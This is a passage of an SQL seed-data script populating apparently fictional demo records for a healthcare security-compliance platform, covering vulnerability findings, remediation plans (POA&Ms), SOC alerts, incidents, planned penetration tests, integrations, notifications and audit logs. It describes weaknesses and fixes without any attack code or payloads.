  ('find-phs-009', 'org-phs-001', 'asset-phs-007', NULL, 'scan-phs-20260218', 'Redis Instance Without Authentication', 'The ElastiCache Redis instance (mfehr-cache-01) does not require authentication for connections from within the VPC. While network-level controls restrict access to application servers, defense in depth requires Redis AUTH.', 'medium', 5.9, 'ElastiCache Redis 7.0 - AUTH configuration', NULL, 'Enable Redis AUTH with a strong password stored in AWS Secrets Manager. Rotate the password quarterly.', 'open', 'user-phs-005', NULL, NULL, NULL, '2026-02-18 09:15:00', '2026-02-18 09:15:00'),

  ('find-phs-010', 'org-phs-001', 'asset-phs-008', NULL, 'scan-phs-20260218', 'Load Balancer Health Check Exposes Version Information', 'The ALB health check endpoint /health returns detailed version information including application version, framework version, and database driver version in the response body.', 'medium', 4.3, 'AWS ALB - /health endpoint', NULL, 'Modify health check to return only HTTP 200 status without body content. Move detailed health information to an authenticated /admin/health endpoint.', 'remediated', 'user-phs-005', '2026-02-18 14:00:00', '2026-02-19 06:00:00', NULL, '2026-02-18 09:30:00', '2026-02-19 06:00:00'),

  ('find-phs-011', 'org-phs-001', 'asset-phs-011', NULL, 'scan-phs-20260218', 'Content Security Policy Not Configured', 'The SecureComm Patient Portal frontend does not implement Content Security Policy (CSP) headers, increasing the risk of XSS and data injection attacks.', 'medium', 5.0, 'Cloudflare Pages - HTTP Headers', NULL, 'Configure CSP headers via Cloudflare Transform Rules. Recommended policy: default-src self; script-src self cdn.example.com; style-src self unsafe-inline.', 'in_progress', 'user-phs-004', NULL, NULL, NULL, '2026-02-18 09:45:00', '2026-02-19 06:00:00'),

  ('find-phs-012', 'org-phs-001', 'asset-phs-017', NULL, 'scan-phs-20260218', 'AWS Glue Job Logging Insufficient', 'The HOAP ETL Glue jobs do not log sufficient detail for security audit requirements. Job execution logs lack source data lineage and transformation details required by HIPAA audit trail requirements.', 'medium', 4.0, 'AWS Glue ETL Jobs - Logging Configuration', NULL, 'Enable detailed Glue job logging. Configure CloudWatch log groups with appropriate retention. Add data lineage tracking to ETL scripts.', 'open', 'user-phs-003', NULL, NULL, NULL, '2026-02-18 10:00:00', '2026-02-18 10:00:00'),

  ('find-phs-013', 'org-phs-001', 'asset-phs-022', NULL, 'scan-phs-20260218', 'Splunk Universal Forwarder Outdated', 'The Splunk Universal Forwarder on the SIEM server is version 9.0.3, which is 2 versions behind current. While no critical CVEs exist for this version, maintaining current software is required by CM-3.', 'medium', 4.5, 'Splunk Universal Forwarder 9.0.3', NULL, 'Upgrade Splunk Universal Forwarder to version 9.2.x. Test log forwarding after upgrade.', 'open', 'user-phs-005', NULL, NULL, NULL, '2026-02-18 10:15:00', '2026-02-18 10:15:00'),

  -- Low (5)
  ('find-phs-014', 'org-phs-001', 'asset-phs-001', NULL, 'scan-phs-20260218', 'HTTP Server Header Disclosure', 'Web server response headers include Server: nginx/1.24.0, revealing specific software version information.', 'low', 3.1, 'NGINX 1.24.0 - Response Headers', NULL, 'Add server_tokens off; to NGINX configuration to suppress version information.', 'open', 'user-phs-005', NULL, NULL, NULL, '2026-02-18 10:30:00', '2026-02-18 10:30:00'),

  ('find-phs-015', 'org-phs-001', 'asset-phs-012', NULL, 'scan-phs-20260218', 'Missing X-Content-Type-Options Header', 'The SCPP API responses do not include X-Content-Type-Options: nosniff header.', 'low', 2.6, 'SCPP API v1.8.2 - Response Headers', NULL, 'Add X-Content-Type-Options: nosniff to all API responses via middleware.', 'remediated', 'user-phs-004', '2026-02-18 16:00:00', '2026-02-19 06:00:00', NULL, '2026-02-18 10:45:00', '2026-02-19 06:00:00'),

  ('find-phs-016', 'org-phs-001', 'asset-phs-013', NULL, 'scan-phs-20260218', 'Missing X-Content-Type-Options Header', 'SCPP API server 02 has same missing header as server 01.', 'low', 2.6, 'SCPP API v1.8.2 - Response Headers', NULL, 'Apply same fix as scpp-api-01.', 'remediated', 'user-phs-004', '2026-02-18 16:00:00', '2026-02-19 06:00:00', NULL, '2026-02-18 10:45:00', '2026-02-19 06:00:00'),

  ('find-phs-017', 'org-phs-001', 'asset-phs-018', NULL, 'scan-phs-20260218', 'Redshift Cluster Not Using Latest SSL Certificate', 'The HOAP Redshift cluster is using an older AWS SSL certificate bundle (rds-combined-ca-bundle-2019.pem) instead of the current 2024 bundle.', 'low', 2.1, 'Amazon Redshift - SSL Configuration', NULL, 'Update SSL certificate bundle to rds-combined-ca-bundle-2024.pem. Update JDBC connection strings in ETL jobs.', 'open', 'user-phs-003', NULL, NULL, NULL, '2026-02-18 11:00:00', '2026-02-18 11:00:00'),

  ('find-phs-018', 'org-phs-001', 'asset-phs-019', NULL, 'scan-phs-20260218', 'Tableau Server Using Default Session Timeout', 'The Tableau Server is using the default 240-minute session timeout instead of the organizational requirement of 30 minutes for applications processing health data.', 'low', 3.3, 'Tableau Server 2023.3 - Session Configuration', NULL, 'Configure wgserver.session.idle_limit to 30 minutes in TSM CLI. Restart Tableau Server.', 'open', 'user-phs-006', NULL, NULL, NULL, '2026-02-18 11:15:00', '2026-02-18 11:15:00');

-- ========================================
-- 7. POA&Ms (8 POA&Ms linked to findings)
-- ========================================
INSERT OR IGNORE INTO poams (id, organization_id, system_id, control_implementation_id, poam_id, weakness_name, weakness_description, source, source_reference, risk_level, likelihood, impact, original_risk_rating, residual_risk_rating, point_of_contact_id, remediation_plan, milestones, scheduled_completion_date, actual_completion_date, cost_estimate, resources_required, status, delay_reason, vendor_dependency, verification_method, verification_date, verified_by, comments, created_at, updated_at)
VALUES
  ('poam-phs-001', 'org-phs-001', 'sys-phs-001', NULL, 'POAM-PHS-2026-001', 'Critical: Log4j Remote Code Execution (CVE-2021-44228)', 'The database monitoring agent uses Apache Log4j 2.14.1 which is vulnerable to Log4Shell (CVE-2021-44228), allowing unauthenticated remote code execution. CVSS 9.8. Exploitation could lead to complete compromise of the database tier containing PHI for 2.3 million veterans.', 'scan', 'ForgeScan-20260218-001', 'critical', 'high', 'critical', 'Critical', 'High', 'user-phs-005', 'Phase 1: Apply immediate mitigation (log4j2.formatMsgNoLookups=true). Phase 2: Test Log4j 2.17.1 in staging environment. Phase 3: Deploy upgrade to production with change management approval. Phase 4: Verify remediation via targeted rescan.', '[{"id": 1, "description": "Apply interim mitigation property", "due_date": "2026-02-19", "status": "completed"}, {"id": 2, "description": "Test Log4j 2.17.1 in staging", "due_date": "2026-02-21", "status": "in_progress"}, {"id": 3, "description": "Deploy to production via CR", "due_date": "2026-02-24", "status": "planned"}, {"id": 4, "description": "Verify with targeted rescan", "due_date": "2026-02-25", "status": "planned"}]', '2026-02-25', NULL, 5000.00, 'DevOps Engineer (8 hrs), Security Analyst (4 hrs), Change Advisory Board approval', 'in_progress', NULL, NULL, 'Targeted vulnerability rescan of affected components', NULL, NULL, 'Interim mitigation applied 2026-02-18 at 15:30 UTC. Staging test scheduled for 2026-02-21.', '2026-02-18 08:00:00', '2026-02-19 06:00:00'),

  ('poam-phs-002', 'org-phs-001', 'sys-phs-001', NULL, 'POAM-PHS-2026-002', 'Critical: SQL Injection in Patient Search API', 'The /api/v2/patients/search endpoint is vulnerable to SQL injection via double URL-encoded characters in the last_name parameter. Exploitation could expose PHI for all 2.3 million veteran patients. CVSS 9.1.', 'scan', 'ForgeScan-20260218-002', 'critical', 'high', 'critical', 'Critical', 'Moderate', 'user-phs-005', 'Phase 1: Deploy emergency WAF rule blocking double-encoded characters. Phase 2: Refactor patient search to use parameterized queries exclusively. Phase 3: Add secondary input validation layer. Phase 4: Conduct penetration test to verify fix.', '[{"id": 1, "description": "Deploy emergency WAF rule", "due_date": "2026-02-19", "status": "completed"}, {"id": 2, "description": "Refactor to parameterized queries", "due_date": "2026-02-26", "status": "in_progress"}, {"id": 3, "description": "Add input validation layer", "due_date": "2026-02-28", "status": "planned"}, {"id": 4, "description": "Penetration test verification", "due_date": "2026-03-03", "status": "planned"}]', '2026-03-03', NULL, 12000.00, 'Senior Developer (24 hrs), Security Analyst (8 hrs), Penetration Tester (8 hrs)', 'in_progress', NULL, NULL, 'Targeted penetration test of patient search endpoint', NULL, NULL, 'Emergency WAF rule deployed 2026-02-18. Development sprint started for query refactoring.', '2026-02-18 08:30:00', '2026-02-19 06:00:00'),

  ('poam-phs-003', 'org-phs-001', 'sys-phs-001', NULL, 'POAM-PHS-2026-003', 'High: Legacy TLS Protocols Enabled', 'Both MFEHR web servers have TLS 1.0 and TLS 1.1 enabled, violating FedRAMP requirements for TLS 1.2 minimum. Deprecated protocols are vulnerable to known attacks including POODLE and BEAST.', 'scan', 'ForgeScan-20260218-003', 'high', 'moderate', 'high', 'High', 'Low', 'user-phs-005', 'Update NGINX TLS configuration on both web servers to disable TLS 1.0/1.1. Test with all known client applications. Deploy via rolling update to prevent downtime.', '[{"id": 1, "description": "Update NGINX config in staging", "due_date": "2026-02-22", "status": "planned"}, {"id": 2, "description": "Client compatibility testing", "due_date": "2026-02-25", "status": "planned"}, {"id": 3, "description": "Rolling production deployment", "due_date": "2026-02-28", "status": "planned"}, {"id": 4, "description": "SSL scan verification", "due_date": "2026-03-01", "status": "planned"}]', '2026-03-01', NULL, 3000.00, 'DevOps Engineer (6 hrs), QA Analyst (4 hrs)', 'open', NULL, NULL, 'SSL Labs scan and Nessus rescan', NULL, NULL, NULL, '2026-02-18 09:00:00', '2026-02-18 09:00:00'),

  ('poam-phs-004', 'org-phs-001', 'sys-phs-001', NULL, 'POAM-PHS-2026-004', 'High: MuleSoft API Authentication Bypass', 'The MuleSoft ESB integration layer allows unauthenticated access to the HL7 FHIR message transformation endpoint from within the VPC, potentially allowing malformed HL7 messages to reach the EHR database.', 'scan', 'ForgeScan-20260218-004', 'high', 'moderate', 'high', 'High', 'Moderate', 'user-phs-003', 'Apply client_id enforcement on all MuleSoft API policies. Implement mTLS for all service-to-service communication. Add HL7 message schema validation at the integration layer.', '[{"id": 1, "description": "Apply client_id enforcement policy", "due_date": "2026-02-24", "status": "in_progress"}, {"id": 2, "description": "Configure mTLS certificates", "due_date": "2026-03-03", "status": "planned"}, {"id": 3, "description": "Implement message schema validation", "due_date": "2026-03-10", "status": "planned"}, {"id": 4, "description": "Integration testing with VA VistA", "due_date": "2026-03-14", "status": "planned"}]', '2026-03-14', NULL, 8000.00, 'Integration Engineer (16 hrs), Security Analyst (8 hrs), VA VistA team coordination', 'in_progress', NULL, 'VA VistA interface team for joint testing', 'MuleSoft API policy audit and penetration test', NULL, NULL, 'Coordinating with VA VistA team for testing window in March.', '2026-02-18 10:00:00', '2026-02-19 06:00:00'),

  ('poam-phs-005', 'org-phs-001', 'sys-phs-001', NULL, 'POAM-PHS-2026-005', 'High: Bastion Host Missing Critical Patches', 'The bastion host has 7 critical Amazon Linux security patches pending including kernel privilege escalation fixes. Last patched 45 days ago exceeding 30-day SLA.', 'scan', 'ForgeScan-20260218-005', 'high', 'moderate', 'high', 'High', 'Low', 'user-phs-005', 'Apply all pending patches during next maintenance window. Configure AWS Systems Manager Patch Manager for automated weekly patching.', '[{"id": 1, "description": "Apply pending patches in maintenance window", "due_date": "2026-02-22", "status": "planned"}, {"id": 2, "description": "Configure SSM Patch Manager", "due_date": "2026-02-28", "status": "planned"}, {"id": 3, "description": "Verify automated patching works", "due_date": "2026-03-07", "status": "planned"}]', '2026-03-07', NULL, 2000.00, 'System Administrator (4 hrs)', 'open', NULL, NULL, 'Vulnerability rescan post-patching', NULL, NULL, NULL, '2026-02-18 10:30:00', '2026-02-18 10:30:00'),

  ('poam-phs-006', 'org-phs-001', 'sys-phs-002', NULL, 'POAM-PHS-2026-006', 'High: Stored XSS in Patient Messaging', 'The patient messaging feature does not sanitize HTML in message bodies, enabling stored XSS. A malicious patient message could execute JavaScript when viewed by a provider, potentially exfiltrating session tokens or PHI.', 'scan', 'ForgeScan-20260218-006', 'high', 'moderate', 'high', 'High', 'Low', 'user-phs-004', 'Implement server-side HTML sanitization. Add CSP headers. Set HttpOnly on all cookies. Deploy WAF rule as interim protection.', '[{"id": 1, "description": "Deploy WAF rule for XSS patterns", "due_date": "2026-02-20", "status": "completed"}, {"id": 2, "description": "Implement DOMPurify sanitization", "due_date": "2026-02-27", "status": "in_progress"}, {"id": 3, "description": "Add CSP headers", "due_date": "2026-03-01", "status": "planned"}, {"id": 4, "description": "Security regression testing", "due_date": "2026-03-05", "status": "planned"}]', '2026-03-05', NULL, 6000.00, 'Frontend Developer (12 hrs), Security Analyst (4 hrs)', 'in_progress', NULL, NULL, 'Automated XSS testing suite and manual penetration test', NULL, NULL, 'WAF rule deployed as interim control 2026-02-19.', '2026-02-18 11:00:00', '2026-02-19 06:00:00'),

  ('poam-phs-007', 'org-phs-001', 'sys-phs-001', 'ci-phs-004', 'POAM-PHS-2026-007', 'Moderate: Incomplete DLP for Telehealth Module', 'Data Loss Prevention controls are not configured for the new telehealth module deployed January 2026. Outbound communications from telehealth sessions are not scanned for PHI, creating a potential data exfiltration path.', 'assessment', 'Control Assessment AC-4', 'moderate', 'moderate', 'moderate', 'Moderate', 'Moderate', 'user-phs-003', 'Extend existing DLP rules to cover telehealth communication channels. Configure Symantec DLP policies for video, chat, and file transfer within telehealth sessions.', '[{"id": 1, "description": "Define DLP policies for telehealth", "due_date": "2026-03-01", "status": "in_progress"}, {"id": 2, "description": "Configure Symantec DLP rules", "due_date": "2026-03-15", "status": "planned"}, {"id": 3, "description": "Test with synthetic PHI data", "due_date": "2026-03-22", "status": "planned"}, {"id": 4, "description": "Production deployment and verification", "due_date": "2026-03-31", "status": "planned"}]', '2026-03-31', NULL, 15000.00, 'DLP Analyst (20 hrs), Telehealth Team (8 hrs), Symantec Professional Services', 'in_progress', NULL, 'Symantec professional services engagement', 'DLP effectiveness test with synthetic data', NULL, NULL, 'Symantec engagement approved 2026-02-15. Kickoff scheduled 2026-02-25.', '2026-02-10 09:00:00', '2026-02-15 14:00:00'),

  ('poam-phs-008', 'org-phs-001', 'sys-phs-002', 'ci-phs-012', 'POAM-PHS-2026-008', 'Moderate: Delayed Staff Account Deprovisioning', 'Automated deprovisioning of terminated staff accounts experiences a 48-hour delay due to HR system integration lag with Okta, exceeding the 24-hour requirement in AC-2.', 'assessment', 'Control Assessment AC-2', 'moderate', 'moderate', 'moderate', 'Moderate', 'Low', 'user-phs-004', 'Implement real-time webhook from Workday HR to Okta for termination events. Add manual immediate deprovisioning process as interim control.', '[{"id": 1, "description": "Document manual deprovisioning process", "due_date": "2026-02-15", "status": "completed"}, {"id": 2, "description": "Configure Workday webhook to Okta", "due_date": "2026-03-15", "status": "in_progress"}, {"id": 3, "description": "Test end-to-end deprovisioning", "due_date": "2026-03-22", "status": "planned"}, {"id": 4, "description": "Monitor for 30 days", "due_date": "2026-04-22", "status": "planned"}]', '2026-04-22', NULL, 10000.00, 'IAM Engineer (16 hrs), Workday Admin (8 hrs), Okta Admin (8 hrs)', 'in_progress', NULL, 'Workday professional services for webhook configuration', 'Access review audit confirming no orphaned accounts', NULL, NULL, 'Manual process documented and in effect since 2026-02-15. Workday webhook development underway.', '2026-02-08 11:00:00', '2026-02-15 09:00:00');

-- ========================================
-- 8. SECURITY ALERTS (6 alerts showing SOC activity)
-- ========================================
INSERT OR IGNORE INTO security_alerts (id, organization_id, alert_rule_id, title, description, severity, source, source_event_id, affected_assets, indicators, raw_event, status, assigned_to, resolution_notes, resolved_at, related_incident_id, related_poams, created_at, updated_at)
VALUES
  ('alert-phs-001', 'org-phs-001', NULL, 'Multiple Failed Login Attempts - Admin Account', 'Detected 23 failed login attempts for user marcus.chen@patriothealth.com within a 5-minute window from IP 185.234.72.19 (Tor exit node). Account locked after 10th attempt per policy.', 'high', 'Splunk SIEM', 'SPL-20260217-44821', '["asset-phs-003"]', '["185.234.72.19", "tor_exit_node", "brute_force"]', '{"event_type": "auth_failure", "count": 23, "src_ip": "185.234.72.19", "dest_user": "marcus.chen@patriothealth.com", "time_window": "300s"}', 'resolved', 'user-phs-005', 'Confirmed brute force attempt from Tor exit node. Account was automatically locked after 10 failures. IP added to WAF block list. User account unlocked after verification via out-of-band phone call. No successful authentication detected.', '2026-02-17 15:45:00', NULL, '[]', '2026-02-17 14:22:00', '2026-02-17 15:45:00'),

  ('alert-phs-002', 'org-phs-001', NULL, 'Unusual Data Export Volume Detected', 'User lisa.nakamura@patriothealth.com exported 12,847 patient records from the MFEHR system in a single query. This exceeds the normal threshold of 500 records per export.', 'high', 'ForgeComply DLP', 'DLP-20260218-00112', '["asset-phs-005", "asset-phs-003"]', '["bulk_export", "phi", "above_threshold"]', '{"event_type": "data_export", "records": 12847, "user": "lisa.nakamura@patriothealth.com", "table": "patient_records"}', 'resolved', 'user-phs-002', 'Investigation confirmed legitimate business need. User was generating quarterly population health report for VA leadership per approved request PHS-REQ-2026-0087. Export audit trail verified. Manager approval confirmed. No data exfiltration.', '2026-02-18 11:30:00', NULL, '[]', '2026-02-18 09:15:00', '2026-02-18 11:30:00'),

  ('alert-phs-003', 'org-phs-001', NULL, 'Unauthorized API Access Attempt', 'Detected API calls to /api/v2/admin/users endpoint from an IP address not in the allowed CIDR range. Source IP 10.100.5.10 (mfehr-esb-mulesoft) attempted to access administrative endpoints.', 'medium', 'AWS WAF', 'WAF-20260218-88234', '["asset-phs-010", "asset-phs-003"]', '["unauthorized_api", "lateral_movement_attempt"]', '{"event_type": "api_access_denied", "src_ip": "10.100.5.10", "endpoint": "/api/v2/admin/users", "method": "GET"}', 'investigating', 'user-phs-005', NULL, NULL, NULL, '[]', '2026-02-18 16:30:00', '2026-02-19 06:00:00'),

  ('alert-phs-004', 'org-phs-001', NULL, 'SSL Certificate Expiring Within 30 Days', 'The SSL certificate for api-internal.patriothealth.com expires on 2026-03-18. Automated renewal failed due to DNS validation error.', 'medium', 'Certificate Monitor', 'CERT-20260219-001', '["asset-phs-003", "asset-phs-004"]', '["certificate_expiry", "renewal_failure"]', '{"event_type": "cert_expiry_warning", "domain": "api-internal.patriothealth.com", "expiry": "2026-03-18", "days_remaining": 27}', 'acknowledged', 'user-phs-005', NULL, NULL, NULL, '[]', '2026-02-19 06:00:00', '2026-02-19 08:00:00'),

  ('alert-phs-005', 'org-phs-001', NULL, 'GuardDuty: Cryptocurrency Mining DNS Query', 'AWS GuardDuty detected DNS queries to known cryptocurrency mining pools from instance i-0abc123def (mfehr-cache-01). Finding type: CryptoCurrency:EC2/BitcoinTool.B!DNS.', 'high', 'AWS GuardDuty', 'GD-20260216-7723', '["asset-phs-007"]', '["cryptocurrency_mining", "dns_query", "pool.minergate.com"]', '{"event_type": "guardduty_finding", "type": "CryptoCurrency:EC2/BitcoinTool.B!DNS", "instance": "i-0abc123def"}', 'resolved', 'user-phs-005', 'Investigation revealed false positive. DNS query originated from a security scanning tool (ForgeScan) that includes cryptocurrency mining domain checks as part of its DNS policy validation. GuardDuty finding suppressed with documented justification.', '2026-02-16 18:00:00', NULL, '[]', '2026-02-16 14:30:00', '2026-02-16 18:00:00'),

  ('alert-phs-006', 'org-phs-001', NULL, 'PHI Access Outside Business Hours', 'Provider account dr.thompson@va.gov accessed 47 patient records between 02:00-03:30 AM EST, outside normal clinical hours.', 'medium', 'MFEHR Audit Log', 'AUDIT-20260219-0034', '["asset-phs-005"]', '["after_hours_access", "phi", "bulk_access"]', '{"event_type": "phi_access", "user": "dr.thompson@va.gov", "records_accessed": 47, "time_range": "02:00-03:30 EST"}', 'new', NULL, NULL, NULL, NULL, '[]', '2026-02-19 07:45:00', '2026-02-19 07:45:00');

-- ========================================
-- 9. SECURITY INCIDENTS (2 incidents)
-- ========================================
INSERT OR IGNORE INTO security_incidents (id, organization_id, incident_number, title, description, severity, incident_type, status, commander_id, affected_systems, affected_users, timeline, root_cause, impact_assessment, lessons_learned, related_alerts, detected_at, contained_at, eradicated_at, recovered_at, closed_at, created_at, updated_at)
VALUES
  ('inc-phs-001', 'org-phs-001', 'INC-PHS-2026-001', 'Brute Force Attack on Admin Account', 'Coordinated brute force attack targeting administrative account marcus.chen@patriothealth.com from multiple Tor exit nodes. Account was locked automatically after 10 failed attempts. No successful authentication detected. Attack lasted approximately 45 minutes across 3 source IPs.', 'medium', 'unauthorized_access', 'closed', 'user-phs-002', '["sys-phs-001"]', '["user-phs-001"]', '[{"timestamp": "2026-02-17T14:22:00Z", "event": "First failed login detected from 185.234.72.19"}, {"timestamp": "2026-02-17T14:27:00Z", "event": "Account locked after 10 failures"}, {"timestamp": "2026-02-17T14:30:00Z", "event": "Alert escalated to SOC"}, {"timestamp": "2026-02-17T15:00:00Z", "event": "Two additional Tor IPs identified: 91.219.236.196, 178.175.131.194"}, {"timestamp": "2026-02-17T15:15:00Z", "event": "All 3 IPs blocked at WAF"}, {"timestamp": "2026-02-17T15:30:00Z", "event": "User account verified and unlocked via phone verification"}, {"timestamp": "2026-02-17T15:45:00Z", "event": "Incident closed - no compromise detected"}]', 'Automated brute force attack from Tor network targeting known admin email address. Email was likely harvested from public LinkedIn profile or conference speaker list.', 'No data breach or unauthorized access occurred. Account lockout policy functioned as designed. No PHI exposure.', 'Recommend implementing CAPTCHA after 3 failed attempts. Consider hiding specific account existence in login error messages. Add Tor exit node IP block list to WAF proactively.', '["alert-phs-001"]', '2026-02-17 14:22:00', '2026-02-17 14:27:00', '2026-02-17 15:15:00', '2026-02-17 15:30:00', '2026-02-17 15:45:00', '2026-02-17 16:00:00', '2026-02-17 16:00:00'),

  ('inc-phs-002', 'org-phs-001', 'INC-PHS-2026-002', 'Unauthorized API Access from Integration Layer', 'MuleSoft ESB server (mfehr-esb-mulesoft) was observed making unauthorized API calls to the admin user management endpoint. Under investigation to determine if this is a misconfiguration or potential compromise of the integration server.', 'high', 'unauthorized_access', 'investigating', 'user-phs-002', '["sys-phs-001"]', '[]', '[{"timestamp": "2026-02-18T16:30:00Z", "event": "WAF blocked unauthorized API call from 10.100.5.10 to /api/v2/admin/users"}, {"timestamp": "2026-02-18T16:45:00Z", "event": "Alert triaged by SOC analyst David Washington"}, {"timestamp": "2026-02-18T17:00:00Z", "event": "Additional unauthorized calls identified in last 72 hours: 14 blocked requests"}, {"timestamp": "2026-02-19T06:00:00Z", "event": "Network traffic capture initiated on MuleSoft server for forensic analysis"}]', NULL, NULL, NULL, '["alert-phs-003"]', '2026-02-18 16:30:00', NULL, NULL, NULL, NULL, '2026-02-18 17:00:00', '2026-02-19 06:00:00');

-- ========================================
-- 10. SSP DOCUMENTS (2 SSPs in progress)
-- ========================================
INSERT OR IGNORE INTO ssp_documents (id, system_id, version, status, document_path, oscal_json, prepared_by, reviewed_by, approved_by, approved_at, effective_date, notes, created_at, updated_at)
VALUES
  ('ssp-phs-001', 'sys-phs-001', '1.0-DRAFT', 'review', '/documents/ssp/MFEHR_SSP_v1.0_DRAFT.json', '{"system-security-plan": {"uuid": "ssp-phs-001", "metadata": {"title": "MedForge EHR System Security Plan", "last-modified": "2026-02-15T00:00:00Z", "version": "1.0-DRAFT", "oscal-version": "1.1.2"}, "import-profile": {"href": "FedRAMP_Moderate_Baseline"}, "system-characteristics": {"system-name": "MedForge Electronic Health Records", "system-id": "MFEHR", "security-sensitivity-level": "moderate"}}}', 'user-phs-003', 'user-phs-002', NULL, NULL, NULL, 'FedRAMP Moderate SSP - First draft under ISSO review. 15 of 325 controls documented, 310 remaining. Target submission to 3PAO: April 2026.', '2026-01-25 09:00:00', '2026-02-15 14:00:00'),

  ('ssp-phs-002', 'sys-phs-002', '0.5-DRAFT', 'draft', '/documents/ssp/SCPP_SSP_v0.5_DRAFT.json', '{"system-security-plan": {"uuid": "ssp-phs-002", "metadata": {"title": "SecureComm Patient Portal System Security Plan", "last-modified": "2026-02-10T00:00:00Z", "version": "0.5-DRAFT", "oscal-version": "1.1.2"}, "import-profile": {"href": "FedRAMP_Moderate_Baseline"}, "system-characteristics": {"system-name": "SecureComm Patient Portal", "system-id": "SCPP", "security-sensitivity-level": "moderate"}}}', 'user-phs-004', NULL, NULL, NULL, NULL, 'Initial draft. Focus on documenting system boundary and inherited controls from MFEHR. 8 of 325 controls documented.', '2026-02-05 09:00:00', '2026-02-10 16:00:00');

-- ========================================
-- 11. PENTEST ENGAGEMENTS (2)
-- ========================================
INSERT OR IGNORE INTO pentest_engagements (id, organization_id, name, engagement_type, scope_description, rules_of_engagement, target_systems, start_date, end_date, status, lead_tester_id, team_members, findings_summary, report_path, created_at, updated_at)
VALUES
  ('pentest-phs-001', 'org-phs-001', 'MFEHR Pre-ATO Penetration Test', 'web_app', 'Comprehensive web application penetration test of the MedForge EHR system including all API endpoints, authentication mechanisms, session management, and data handling. Includes OWASP Top 10 testing and PHI-specific data exposure scenarios.', 'Testing authorized for MFEHR staging environment only (staging.mfehr.patriothealth.com). No testing against production. No denial of service attacks. No social engineering. Testing window: M-F 08:00-18:00 EST. Emergency contact: David Washington (user-phs-005).', '["sys-phs-001"]', '2026-03-01', '2026-03-14', 'planned', 'user-phs-005', '["user-phs-005", "user-phs-007"]', NULL, NULL, '2026-02-15 09:00:00', '2026-02-15 09:00:00'),

  ('pentest-phs-002', 'org-phs-001', 'SCPP Mobile Application Security Assessment', 'mobile', 'Security assessment of the SecureComm Patient Portal iOS and Android mobile applications. Includes static analysis, dynamic analysis, API security testing, and data-at-rest encryption verification.', 'Testing authorized against mobile app builds from TestFlight (iOS) and Firebase App Distribution (Android). API testing against staging endpoint only. No patient data to be used in testing - synthetic test data provided.', '["sys-phs-002"]', '2026-03-15', '2026-03-28', 'planned', 'user-phs-005', '["user-phs-005"]', NULL, NULL, '2026-02-15 10:00:00', '2026-02-15 10:00:00');

-- ========================================
-- 12. INTEGRATIONS (4 active integrations)
-- ========================================
INSERT OR IGNORE INTO integrations (id, organization_id, name, integration_type, config_encrypted, status, last_sync_at, error_message, created_by, created_at, updated_at)
VALUES
  ('int-phs-001', 'org-phs-001', 'Splunk SIEM', 'siem_splunk', '{"host": "phs-siem-splunk.internal", "port": 8089, "index": "forgecomply"}', 'active', '2026-02-19 06:00:00', NULL, 'user-phs-005', '2026-01-20 09:00:00', '2026-02-19 06:00:00'),
  ('int-phs-002', 'org-phs-001', 'AWS GovCloud', 'cloud_aws', '{"region": "us-gov-east-1", "role_arn": "arn:aws-us-gov:iam::123456789012:role/ForgeComplyReadOnly"}', 'active', '2026-02-19 05:00:00', NULL, 'user-phs-001', '2026-01-20 10:00:00', '2026-02-19 05:00:00'),
  ('int-phs-003', 'org-phs-001', 'Okta Identity', 'identity_okta', '{"domain": "patriothealth.okta.com", "api_token": "encrypted"}', 'active', '2026-02-19 04:00:00', NULL, 'user-phs-002', '2026-01-20 11:00:00', '2026-02-19 04:00:00'),
  ('int-phs-004', 'org-phs-001', 'ServiceNow ITSM', 'itsm_servicenow', '{"instance": "patriothealth.service-now.com"}', 'active', '2026-02-18 22:00:00', NULL, 'user-phs-002', '2026-01-20 14:00:00', '2026-02-18 22:00:00');

-- ========================================
-- 13. NOTIFICATIONS (recent activity)
-- ========================================
INSERT OR IGNORE INTO notifications (id, organization_id, user_id, type, title, message, data, channel, is_read, read_at, created_at)
VALUES
  ('notif-phs-001', 'org-phs-001', 'user-phs-001', 'vulnerability', 'Critical Vulnerability Detected', 'ForgeScan detected a critical vulnerability (Log4Shell) on mfehr-db-primary. POAM-PHS-2026-001 has been automatically created.', '{"finding_id": "find-phs-001", "poam_id": "poam-phs-001"}', 'in_app', 1, '2026-02-18 08:05:00', '2026-02-18 07:15:00'),
  ('notif-phs-002', 'org-phs-001', 'user-phs-001', 'vulnerability', 'Critical Vulnerability Detected', 'ForgeScan detected SQL Injection in Patient Search API. POAM-PHS-2026-002 created.', '{"finding_id": "find-phs-002", "poam_id": "poam-phs-002"}', 'in_app', 1, '2026-02-18 08:30:00', '2026-02-18 07:22:00'),
  ('notif-phs-003', 'org-phs-001', 'user-phs-005', 'scan_complete', 'Vulnerability Scan Complete', 'Weekly infrastructure scan completed. 18 findings: 2 Critical, 5 High, 6 Medium, 5 Low.', '{"scan_id": "scan-phs-20260218", "total": 18, "critical": 2, "high": 5, "medium": 6, "low": 5}', 'in_app', 1, '2026-02-18 12:00:00', '2026-02-18 11:30:00'),
  ('notif-phs-004', 'org-phs-001', 'user-phs-002', 'incident', 'Security Incident Opened', 'INC-PHS-2026-002: Unauthorized API access from MuleSoft integration server. Investigation initiated.', '{"incident_id": "inc-phs-002"}', 'in_app', 1, '2026-02-18 17:15:00', '2026-02-18 17:00:00'),
  ('notif-phs-005', 'org-phs-001', 'user-phs-003', 'compliance', 'SSP Review Reminder', 'The MFEHR SSP (v1.0-DRAFT) has been in review status for 4 days. 310 controls still require documentation.', '{"ssp_id": "ssp-phs-001"}', 'in_app', 0, NULL, '2026-02-19 08:00:00'),
  ('notif-phs-006', 'org-phs-001', 'user-phs-006', 'poam', 'POA&M Due Date Approaching', 'POAM-PHS-2026-005 (Bastion Host Patches) is due in 3 days. Current status: Open.', '{"poam_id": "poam-phs-005"}', 'in_app', 0, NULL, '2026-02-19 08:00:00');

-- ========================================
-- 14. AUDIT LOGS (recent activity trail)
-- ========================================
INSERT OR IGNORE INTO audit_logs (id, organization_id, user_id, action, resource_type, resource_id, old_values, new_values, ip_address, user_agent, created_at)
VALUES
  ('log-phs-001', 'org-phs-001', 'user-phs-005', 'scan_initiated', 'vulnerability_scan', 'scan-phs-20260218', NULL, '{"scan_type": "full", "targets": "all_systems"}', '10.100.0.50', 'ForgeScan/2.1', '2026-02-18 02:00:00'),
  ('log-phs-002', 'org-phs-001', 'user-phs-005', 'scan_completed', 'vulnerability_scan', 'scan-phs-20260218', NULL, '{"findings": 18, "critical": 2, "high": 5, "medium": 6, "low": 5}', '10.100.0.50', 'ForgeScan/2.1', '2026-02-18 06:45:00'),
